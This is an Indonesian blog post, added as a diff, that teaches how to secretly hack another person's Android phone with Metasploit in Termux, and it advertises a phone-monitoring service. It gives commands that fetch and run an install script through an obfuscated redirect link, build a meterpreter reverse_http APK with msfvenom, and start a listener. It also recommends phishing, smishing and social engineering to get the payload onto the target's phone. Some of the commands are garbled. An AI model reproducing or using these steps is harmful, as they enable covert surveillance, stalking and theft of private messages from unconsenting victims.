@@ -1,0 +1,164 @@
+﻿---
+link_referral:
+  - https://ac10tech.id/sadap-hp-termux/
+draft: false
+toc: true
+preview: true
+author: Ayu Dewi
+lastmod: 2022-07-05T17:00:00+09:00
+title: Panduan Hack HP Orang Lain dengan Metasploit Termux
+date: 2024-02-26T03:35:54.511Z
+description: cara hack hp orang lain dengan metasploit termux, untuk sadap wa
+  facebook telegram secara jarak jauh dengan mudah
+thumbnail: /uploads/media/panduan-sadap-hp-termux-45.jpg
+tags:
+  - sadap
+categories:
+  - penyadap
+authors:
+  - Budiono Pasaribu
+---
+![sadap hp termux](/uploads/media/panduan-sadap-hp-termux-45.jpg)
+
+**Cara Mudah Hack HP Orang Lain dengan Termux Metasploit** – Banyak pengunjung *sadapphone* yang ingin tahu cara mengendalikan hp orang lain tanpa diketahui untuk keperluan tertentu, seperti untuk membuka  / akses kamera ponsel, atau mengawasi aktivitas orang terdekat.
+
+Tetapi tidak sedikit yang sudah mengeluh sebelum mencobanya karena mereka terbayang akan kerumitan coding saat menyadap hp orang lain.
+
+Apakah menyadap ponsel itu hal yang sulit? Nyatanya untuk bajak data ponsel orang lain bisa dilakukan tanpa coding salah satunya adalah dengan aplikasi sadap selain menggunakan Termux .
+
+Mungkin sebagian dari orang belum tahu *apa itu Termux*, ada baiknya bisa simak terlebih dahulu sedikit ulasan tentang apa itu Termux yang sudah saya jelaskan secara singkat sebagai berikut.
+
+<div class="qc-wrapper">
+  <div class="qc-card">
+    <div class="h2 qc-title">Aplikasi Pengawas HP Jarak Jauh?</div>
+    <p class="qc-subtitle">📱 Mendukung iPhone & Android</p>
+    <img
+      src="/images/sadap-phone.webp"
+      alt="Layanan Monitoring Perangkat"
+      class="qc-image"
+    />
+    <div class="qc-features">
+      <p>• 💬 Monitoring aktivitas aplikasi pesan (WhatsApp, Telegram, Line, Instagram, Facebook, Skype, Viber, Snapchat)</p>
+      <p>• 📷 Pemantauan kamera & layar dengan izin pemilik perangkat</p>
+      <p>• 📞 Riwayat panggilan telepon & akses galeri</p>
+    </div>
+    <p class="qc-note">
+      🔒 Penggunaan sah & dengan persetujuan pemilik perangkat
+    </p>
+    <a
+      href="https://wa.me/62812345678"
+      class="qc-button"
+    >
+      Hubungi via WhatsApp
+    </a>
+  </div>
+</div>
+
+## Apa itu Termux?
+
+Pada dasarnya, Termux adalah aplikasi emulator terminal untuk Android serta *Linux environment* yang berjalan di ponsel mobile tanpa perlu akses root atau pengaturan khusus agar dapat menggunakannya.
+
+Tool / paket tambahan juga tersedia dan dapat di pasang menggunakan *APT package manager*.
+
+Yang membedakan Termux dari aplikasi emulator terminal lainnya adalah bahwa Termux sudah diatur sedemikian rupa sehingga *environment* di Termux menyerupai seperti dengan *environment* Linux Debian.
+
+Karena *environment* Android berbeda dengan environment Linux pada umumnya maka di Termux dapat menginstall package yang biasa digunakan di system operasi Linux.
+
+Dengan fitur dan pengaturan environment seperti di atas membuat Termux menjadi sangat spesial karena pengguna dapat menginstall *Penetration Testing Tools* atau tool untuk hacking seperti Metasploit dan net hunter di ponsel Android dengan hanya menggunakan Termux .
+
+Termux juga menyediakan *package manager (APT*) untuk memudahkan menemukan dan menginstall paket yang dibutuhkan dari perangkat lunak yang disediakan oleh Termux.
+
+Dalam tutorial ini saya akan menunjukkan cara bikin payload dasar untuk Android untuk hack ponsel orang lain tanpa harus menggunakan komputer.
+
+Untuk melakukan itu hanya perlu menginstall Termux serta pasang beberapa paket terlebih dahulu, dan ini wajib dilakukan.
+
+Untuk lebih jelasnya Anda bisa simak cara download aplikasi Termux serta pemasangan tool metasploit pada aplikasi Termux seperti berikut ini.
+
+## Bagaimana Download Termux
+
+Dengan fungsinya yang sangat luar biasa, banyak orang yang menginginkan aplikasi Termux. Lalu dimana pengguna bisa download Termux?
+
+Anda bisa mendapatkan aplikasi Termux secara gratis melalui *Google Play Store* pada smartphone Android saja.
+
+Selain itu, juga bisa download dengan klik link di bawah ini.
+
+Download: https://play.google.com/store/apps/details?id=com.termux&hl=en_US
+
+## Menyadap HP Orang Lain - Termux
+
+Setelah anda mendownload aplikasi Termux diatas, sekarang kita lanjut bagaimana cara sadap hp android orang lain? Untuk tahu caranya kamu ikuti tutorial kali ini.
+
+Dibawah ini kita akan menggunakan script Termux metasploit untuk sadap hp.
+
+* Pastikan jangan sampai kode Termux dilewatkan, kurang huruf dan lainnya yang akan menyebabkan error.
+* Perhatikan dan pahami setiap baris perintah, sehingga memudahkan dalam menjalankan perintah dari setiap script.
+
+## Hack HP - Metasploit Termux
+
+Sekarang setelah Anda selesai menginstall aplikasi Termux dan konfigurasi, perlu menginstall tool yang akan digunakan nantinya bernama script *Metasploit*.
+
+Jika pengguna tidak tahu apa itu Metasploit, Adalah sebuah tool yang digunakan untuk ahli keamanan cyber untuk tujuan pentesting *(menguji setiap keamanan sistem)*.
+
+Berikut cara hack hp orang dengan metasploit Termux.
+
+## Install Metasploit Termux Sadap HP
+
+Tata cara untuk menginstall Metasploit dengan Termux untuk sadap hp berikut di aplikasi Termux yang ada di ponsel Android.
+
+`**$ apt-get update**`
+
+`**$ apt-get upgrade**`
+
+`**$ apt-get install wget**`
+
+`**$ wget  [https://github.com/1Tech-X/Auxilus.github.io/blob/master/metasploit.sh](https://trikwiki.com/excellent-ideas-and-examples-of-saas-startups/?url=aHR0cHM6Ly9naXRodWIuY29tLzFUZWNoLVgvQXV4aWx1cy5naXRodWIuaW8vYmxvYi9tYXN0ZXIvbWV0YXNwbG9pdC5zaA==)**`
+
+`**$ cd Home**`
+
+`**$ bash Metasploit.sh**`
+
+## Program Script Termux - Sadap HP
+
+Setelah Metasploit berhasil terpasang, pengguna dapat memuat payloud Android dengan perintah kode Termux berikut:
+
+**`msfvenom -p android/meterpreter/reverse_http lhost = "alamat IP Anda" 8080 r> "nama aplikasi".apk`**
+
+* ***lhost***  = Alamat IP, dapat memeriksa alamat IP hanya dengan mengetik ipconfig di termux lalu tekan enter. akan muncul IP untuk beberapa saat.
+* ***r>***  = kasih nama aplikasi payloud dengan .apk untuk android *(beri nama secara bebas)*
+
+Setelah selesai menginstall, pengguna dapat memeriksa payload dengan input perintah "ls" di aplikasi Termux.
+
+Sekarang ketika Anda telah berhasil membuat payload Anda dapat memulai metasploit listener untuk membuat sesi dengan smartphone target, untuk melakukannya cukup ketik perintah berikut ini:
+
+`**$ msfconsole**`
+
+`**$ use exploit/multi/handler**`
+
+`**$ set payload android/meterpreter/reverse_http**`
+
+`**$ set lhost = (IP Anda)**`
+
+`**$ set lport = 8080**`
+
+`**$ exploit**`
+
+Saat exploit, metasploit akan memulai koneksi dari ponsel, sekarang setelah selesai dengan semua langkah di atas, harus mengirim payload yang sudah dibuat sebelumnya ke smartphone target.
+
+Setelah target menginstall di ponsel, akan mendapatkan koneksi dari target.
+
+Ada begitu banyak cara berbeda untuk mengirim payload ke target seperti link phishing, spoofing email, smishing, dan *social engineering* masih banyak lagi.
+
+Jika mendapatkan error saat menginstall metasploit silahkan teliti lagi apakah ada langkah yang dilewatkan atau tidak.
+
+Kebanyakan orang merasa sulit untuk menginstall metasploit atau memasang dan jangan buru-buru sehingga ada langkah yang tidak dilakukan.
+
+Catatan: Harap diperhatikan kalau cara menyadap hp orang lain dengan Termux ini hanya sebagai informasi saja, apabila ingin mencoba sebaiknya gunakan untuk menyadap ponsel milik teman dan tentunya dengan persetujuan terlebih dahulu ya.
+
+Demikian saja pembahasan saya tentang bagaimana cara sadap hp orang dengan Termux tanpa root.
+
+Semoga dengan ulasan artikel *menyadap.github.io* ini, bisa lebih berhati-hati dengan penyadapan ponsel yang saat ini marak terjadi saat ini.
+
+Jangan lupa simak artikel seputar teknologi dan hacking yang lain hanya ada di blog ini.
+
+Terima kasih.
+
